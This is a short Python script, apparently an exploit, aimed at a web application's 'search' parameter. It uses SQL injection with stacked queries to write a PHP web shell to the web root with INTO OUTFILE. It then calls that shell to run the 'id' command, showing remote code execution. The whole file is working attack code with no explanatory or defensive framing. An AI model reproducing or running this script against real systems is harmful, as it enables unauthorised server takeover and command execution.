#!/usr/bin/env python3
import requests, sys
from urllib.parse import urljoin
HOST = sys.argv[1]
wp = lambda x: urljoin(f"http://{HOST}", x)
_s = requests.session()

def exec(query):
    return _s.get(wp("/"), params={"search": f"%';{query};-- -#"}).text

print(exec("SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/x.php'"))
print(_s.get(wp("/x.php"), params={"0": "id"}).text)
